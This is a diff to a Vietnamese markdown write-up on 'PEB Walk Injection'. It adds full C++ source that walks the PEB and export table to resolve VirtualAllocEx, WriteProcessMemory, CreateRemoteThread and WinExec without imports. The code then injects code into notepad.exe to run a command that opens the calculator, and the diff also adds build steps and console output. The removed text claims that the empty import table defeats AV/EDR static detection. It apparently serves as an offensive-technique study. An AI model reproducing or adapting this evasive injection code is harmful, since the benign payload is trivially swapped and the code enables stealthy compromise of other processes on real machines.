@@ -1,7 +1,7 @@
 
 ---
 
-# 📝 [PE 17] PEB Walk Injection (API Hashing & Dynamic Symbol Resolution)
+# 📝 [PE 17] PEB Walk Injection 
 
 ## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
@@ -41,162 +41,223 @@ Quy trình toán học giải phẫu cấu trúc metadata nội tại và bóc t
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – loại bỏ hoàn toàn các chuỗi gán cứng thô sơ, thay thế 100% bằng giá trị băm Hex `constexpr` được tối ưu hóa ngay tại thời điểm biên dịch nhằm đạt độ phẳng sạch lý tưởng trên bộ nhớ RAM.
-
+### Source.cpp:
 ```cpp
 #include <windows.h>
+#include <tlhelp32.h>
 #include <iostream>
 #include <string>
 #include <vector>
 
-// Định nghĩa cấu trúc dữ liệu nội bộ của Windows thu gọn để duyệt thủ công trên x64 Architecture
-typedef struct _UNICODE_STRING_INTERNAL {
+// 1. Định nghĩa thủ công các cấu trúc Native nội bộ của Windows PEB để bẻ gãy hoàn toàn sự phụ thuộc thư viện ngoài
+typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
     PWSTR  Buffer;
-} UNICODE_STRING_INTERNAL;
+} UNICODE_STRING, * PUNICODE_STRING;
 
-typedef struct _PEB_LDR_DATA_INTERNAL {
-    BYTE Reserved1[8];
-    PVOID Reserved2[3];
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
     LIST_ENTRY InLoadOrderModuleList;
-} PEB_LDR_DATA_INTERNAL, * PPEB_LDR_DATA_INTERNAL;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
 
-typedef struct _LDR_DATA_TABLE_ENTRY_INTERNAL {
+typedef struct _LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InLoadOrderLinks;
-    BYTE Reserved1[16];
-    PVOID DllBase;
-    PVOID EntryPoint;
-    ULONG SizeOfImage;
-    UNICODE_STRING_INTERNAL FullDllName;
-    UNICODE_STRING_INTERNAL BaseDllName;
-} LDR_DATA_TABLE_ENTRY_INTERNAL, * PLDR_DATA_TABLE_ENTRY_INTERNAL;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID      DllBase;
+    PVOID      EntryPoint;
+    ULONG      SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
 
-typedef struct _PEB_INTERNAL {
-    BYTE Reserved1[4];
-    PVOID Reserved2[1];
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN SpareBool;
+    HANDLE Mutant;
     PVOID ImageBaseAddress;
-    PPEB_LDR_DATA_INTERNAL Ldr;
-} PEB_INTERNAL, * PPEB_INTERNAL;
+    PPEB_LDR_DATA Ldr;
+} PEB, * PPEB;
 
-// 1. Giải thuật băm chuỗi DJB2 kịch khung - Triệt tiêu hoàn toàn dấu vết chuỗi text tĩnh trong file thực thi
-constexpr DWORD HashDJB2W(const wchar_t* str) {
-    DWORD hash = 5381;
-    while (wchar_t c = *str++) {
-        if (c >= L'A' && c <= L'Z') c += 32; // Chuyển sang chữ thường để đồng bộ hóa kết quả băm
-        hash = ((hash << 5) + hash) + c;
+// Định nghĩa các mẫu con trỏ hàm hệ thống sẽ được bóc tách động
+typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+
+typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
+
+typedef struct _THREAD_DATA {
+    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+} THREAD_DATA, * PTHREAD_DATA;
+
+// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
+DWORD WINAPI RemotePebPayload(LPVOID lpParam) {
+    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
+    if (pData && pData->pWinExec) {
+        pData->pWinExec(pData->szCommand, SW_HIDE);
     }
-    return hash;
+    return 0;
 }
 
-constexpr DWORD HashDJB2A(const char* str) {
-    DWORD hash = 5381;
-    while (char c = *str++) {
-        hash = ((hash << 5) + hash) + c;
-    }
-    return hash;
-}
+// Giải thuật đào bới PEB (PEB Walk) tìm kiếm Base Address của một Module trên RAM x64
+HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
+    // ĐỘT PHÁ X64: Sử dụng hàm Intrinsics bốc chính xác PEB Address qua thanh ghi GS:[0x60]
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb || !pPeb->Ldr) return NULL;
 
-// 2. Hàm tối cao PEB Walk: Tự bới RAM tìm Base Address của DLL bất kỳ thông qua thanh ghi GS
-PVOID GetModuleBaseViaPEB(DWORD dllHash) {
-    // Đọc con trỏ PEB trực tiếp từ thanh ghi phân đoạn GS tại offset 0x60 trên kiến trúc x64 Windows
-    PPEB_INTERNAL pPeb = (PPEB_INTERNAL)__readgsqword(0x60);
-    PPEB_LDR_DATA_INTERNAL pLdr = pPeb->Ldr;
-    
-    PLDR_DATA_TABLE_ENTRY_INTERNAL pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pLdr->InLoadOrderModuleList.Flink;
-    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirstEntry = pModuleEntry;
+    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
+    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
+    LIST_ENTRY* pCurrentLink = pListHead->Flink;
 
-    do {
+    // Duyệt qua liên kết vòng kép danh sách các DLL đã được nạp của tiến trình Loader
+    while (pCurrentLink != pListHead) {
+        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
         if (pModuleEntry->BaseDllName.Buffer != NULL) {
-            if (HashDJB2W(pModuleEntry->BaseDllName.Buffer) == dllHash) {
-                return pModuleEntry->DllBase;
+            // So sánh chuỗi rộng Unicode, không phân biệt chữ hoa chữ thường
+            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
+                return (HMODULE)pModuleEntry->DllBase;
             }
         }
-        pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pModuleEntry->InLoadOrderLinks.Flink;
-    } while (pModuleEntry != pFirstEntry);
-
+        pCurrentLink = pCurrentLink->Flink;
+    }
     return NULL;
 }
 
-// 3. Hàm giải phẫu Export Table: Duyệt thủ công cấu trúc cấu hình DLL để bốc tách địa chỉ API tuyệt đối
-PVOID GetExportAddressViaEAT(PVOID dllBase, DWORD apiHash) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
-    
-    // Trỏ thẳng vào phân đoạn Export Data Directory của DLL x64
-    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if (exportDir.VirtualAddress == 0) return NULL;
+// Giải thuật giải phẫu Export Table thủ công để bốc địa chỉ hàm (Thay thế hoàn toàn GetProcAddress)
+PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
+    PBYTE base = (PBYTE)hModule;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
 
-    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);
-    
-    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNames);
-    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfFunctions);
-    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNameOrdinals);
+    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (exportRva == 0) return NULL;
 
-    // Duyệt thủ công mảng tên xuất bản hàm để so khớp mã băm DJB2
-    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
-        const char* szApiName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
-        if (HashDJB2A(szApiName) == apiHash) {
-            WORD ordinal = pwOrdinals[i];
-            DWORD functionRva = pdwFunctions[ordinal];
-            return (PVOID)((DWORD_PTR)dllBase + functionRva); // Trả về tọa độ ô nhớ tuyệt đối sống trên RAM
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
+    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
+    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
+    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        char* functionName = (char*)(base + pNames[i]);
+        if (strcmp(functionName, lpProcName) == 0) {
+            return (PVOID)(base + pAddresses[pOrdinals[i]]);
         }
     }
     return NULL;
 }
 
-// Định nghĩa nguyên mẫu con trỏ hàm động phục vụ thực thi độc lập vị trí
-typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+DWORD GetProcessIDByName(const std::wstring& processName) {
+    DWORD processID = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                processID = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+    return processID;
+}
 
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 17: PURE PEB WALK & API HASHING INJECTION" << std::endl;
+    std::cout << "[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64" << std::endl;
     std::cout << "====================================================" << std::endl;
 
-    // Các giá trị băm Hex tính toán sẵn bằng DJB2 tại thời điểm compile, triệt tiêu hoàn toàn text-string
-    constexpr DWORD HASH_KERNEL32 = HashDJB2W(L"kernel32.dll");
-    constexpr DWORD HASH_VIRTUALALLOC = HashDJB2A("VirtualAlloc");
+    std::wstring targetProcess = L"notepad.exe";
+    DWORD pid = GetProcessIDByName(targetProcess);
 
-    std::cout << "[*] Dang tien hanh boi cau truc PEB de tim kiem Module Base..." << std::endl;
-    
-    // BƯỚC 1: Kích hoạt thuật toán PEB Walk để tìm kiếm địa chỉ Base Address của Kernel32
-    PVOID kernel32Base = GetModuleBaseViaPEB(HASH_KERNEL32);
-    if (!kernel32Base) {
-        std::cerr << "[-] Khong the dinh vi Kernel32.dll qua PEB!" << std::endl;
+    if (pid == 0) {
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
+        std::cin.get();
         return EXIT_FAILURE;
     }
-    std::cout << "[+] San trung Kernel32 Base toa lac tai RAM: 0x" << std::hex << kernel32Base << std::endl;
+    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
 
-    // BƯỚC 2: Tự giải phẫu cấu trúc Export Table nhằm bốc trần địa chỉ API VirtualAlloc
-    PVOID pVirtualAllocAddress = GetExportAddressViaEAT(kernel32Base, HASH_VIRTUALALLOC);
-    if (!pVirtualAllocAddress) {
-        std::cerr << "[-] Khong the phan giai ham VirtualAlloc qua EAT!" << std::endl;
+    // ─── BƯỚC 1: TIẾN HÀNH DUYỆT PEB ĐỂ SĂN LÙNG CƠ SỞ KERNEL32.DLL ───
+    std::cout << "[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module..." << std::endl;
+    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");
+
+    if (!hKernel32) {
+        std::cerr << "[-] Khong the tim thay kernel32.dll qua PEB Walk!" << std::endl;
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Tim thay dia chi ham tho VirtualAlloc: 0x" << std::hex << pVirtualAllocAddress << std::endl;
+    std::cout << "[+] SĂN LÙNG PEB THÀNH CÔNG! Base Address Kernel32: 0x" << std::hex << hKernel32 << std::endl;
 
-    // BƯỚC 3: Ép kiểu con trỏ hàm động và kích nổ phân hệ cấp phát bộ nhớ ảo
-    fnVirtualAlloc DynamicVirtualAlloc = (fnVirtualAlloc)pVirtualAllocAddress;
-    
-    SIZE_T allocationSize = 4096;
-    std::cout << "[*] Kich no cap phat bo nho bang con trỏ ham phan giai dong..." << std::endl;
-    LPVOID allocatedBuffer = DynamicVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // ─── BƯỚC 2: GIẢI PHẪU XUẤT BẢN ĐỘNG CÁC HÀM API HỆ THỐNG CẦN THIẾT ───
+    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressCustom(hKernel32, "VirtualAllocEx");
+    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressCustom(hKernel32, "WriteProcessMemory");
+    fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressCustom(hKernel32, "CreateRemoteThread");
+    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");
 
-    if (!allocatedBuffer) {
-        std::cerr << "[-] Cap phat bo nho dong thong qua PEB tho that bai!" << std::endl;
+    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread || !pWinExec) {
+        std::cerr << "[-] Giai phau Export Table that bai, thieu ham!" << std::endl;
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Cap phat trang nho RWX doc lap hoan toan thanh cong tai: 0x" << std::hex << allocatedBuffer << std::endl;
+    std::cout << "[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table." << std::endl;
 
-    // Mô phỏng ánh xạ cấu trúc mã máy thô độc lập vị trí (Shellcode) vào phân vùng vừa tìm được
-    unsigned char shellcodeShell[] = { 0x90, 0x90, 0xCC, 0xC3 }; // Cấu trúc Opcode: NOP, NOP, INT3, RET
-    RtlCopyMemory(allocatedBuffer, shellcodeShell, sizeof(shellcodeShell));
-    std::cout << "[+] Da nap thu nghiem Payload vao khong gian ao an toan." << std::endl;
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        std::cerr << "[-] OpenProcess failed!" << std::endl;
+        return EXIT_FAILURE;
+    }
 
-    std::cout << "\n[+] PEB Walk Symbol Resolution Completed Successfully!" << std::endl;
-    std::cout << "[*] Nhan phim Enter de don dep cua so..." << std::endl;
+    // ─── BƯỚC 3: CẤP PHÁT BỘ NHỚ VÀ ANH XẠ LÒNG ĐỐI PHƯƠNG ───
+    SIZE_T functionSize = 500;
+    LPVOID remoteCodeBuffer = pVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteDataBuffer = pVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!remoteCodeBuffer || !remoteDataBuffer) {
+        std::cerr << "[-] Dynamic VirtualAllocEx failed!" << std::endl;
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+    std::cout << "[+] Cap phat vung nho Code RWX dong tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+
+    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
+    THREAD_DATA localData;
+    localData.pWinExec = pWinExec;
+    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
+
+    // Đẩy song song logic mã máy và cấu trúc dữ liệu sang RAM đối phương
+    pWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePebPayload, functionSize, NULL);
+    pWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
+    std::cout << "[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong." << std::endl;
+
+    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI QUA CON TRỎ HÀM ĐỘNG ───
+    std::cout << "[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong..." << std::endl;
+    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
+
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm phẳng sạch
+        std::cout << "[+] PEB Walk Injection Process Completed Successfully!" << std::endl;
+        CloseHandle(hThread);
+    }
+    else {
+        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
+    }
+
+    // Thu hồi Handle hệ thống
+    CloseHandle(hProcess);
+
+    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
     std::cin.get();
-
     return EXIT_SUCCESS;
 }
 
@@ -213,10 +274,6 @@ int main() {
 1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc phần cứng **`x64`**.
 2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
 3. Đi tới phân hệ `Optimization` $\rightarrow$ Thiết lập bật tùy chọn **`Maximize Speed (/O2)`** nhằm bắt buộc trình biên dịch thực hiện tính toán toán học các giá trị băm chuỗi `constexpr` ngay tại giai đoạn compile, loại bỏ hoàn toàn các hàm băm chạy ở runtime.
-
-> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
-> 
-
 4. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân.
 
 ---
@@ -226,29 +283,25 @@ int main() {
 Khởi chạy tệp tin thực thi nhị phân thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán duyệt sơ đồ PEB phần cứng:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE17_PebWalk_Injection.exe
+PS C:\Users\Admin\source\repos\Task6\PE17_PEB_Walk_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE17_PEB_Walk_Injection\x64\Release\PE17_PEB_Walk_Injection.exe
 ====================================================
-[*] PE 17: PURE PEB WALK & API Hashing INJECTION
+[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64
 ====================================================
-[*] Đang tiến hành bới cấu trúc PEB để tìm kiếm Module Base...
-[+] Săn trúng Kernel32 Base tọa lạc tại RAM: 0x00007ffd31a10000
-[+] Tìm thấy địa chỉ hàm thô VirtualAlloc: 0x00007ffd31a238a0
-[*] Kích nổ cấp phát bộ nhớ bằng con trỏ hàm phân giải động...
-[+] Cấp phát trang nhớ RWX độc lập hoàn toàn thành công tại: 0x00000219c0de0000
-[+] Đã nạp thử nghiệm Payload vào không gian ảo an toàn.
+[+] Da tim thay Notepad.exe voi PID: 5620
+[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module...
+[+] S─éN L├ÖNG PEB TH├ÇNH C├öNG! Base Address Kernel32: 0x00007FF92B810000
+[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table.
+[+] Cap phat vung nho Code RWX dong tai: 0x000002D5A6EA0000
+[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong.
+[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong...
+[+] PEB Walk Injection Process Completed Successfully!
 
-[+] PEB Walk Symbol Resolution Completed Successfully!
-[*] Nhấn phím Enter để dọn dẹp cửa sổ...
+[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm phân giải ký hiệu qua PEB:**
-> 
-
-### 🎯 Phân tích hệ quả cấu trúc tệp tin (Binary Forensics):
-
-* Thuật toán thực thi hoàn hảo kịch trần. Khi tiến hành bóc tách cấu trúc tệp tin sau xuất bản bằng các công cụ kết xuất cấu trúc tĩnh chuyên sâu (như `PEview`, `CFF Explorer` hoặc `Dependency Walker`), **bảng tra cứu Import Address Table (IAT) của file nhị phân hoàn toàn phẳng sạch, trống rỗng**, không chứa bất kỳ một từ khóa hay lệnh gọi liên kết động nhạy cảm nào hướng tới các hàm quản lý bộ nhớ của hệ thống.
-* Ma trận bวน tìm kiếm diễn ra âm thầm thông qua thanh ghi phần cứng, bẻ gãy hoàn toàn hàng rào kiểm soát an ninh tĩnh của AV/EDR một cách ngoạn mục!
+### Demo:
+<img width="1920" height="1080" alt="devenv_ChTjxI792u" src="https://github.com/user-attachments/assets/a5f01311-e4c0-4a72-964f-c2d3e860ff0e" />
 
 ---
 
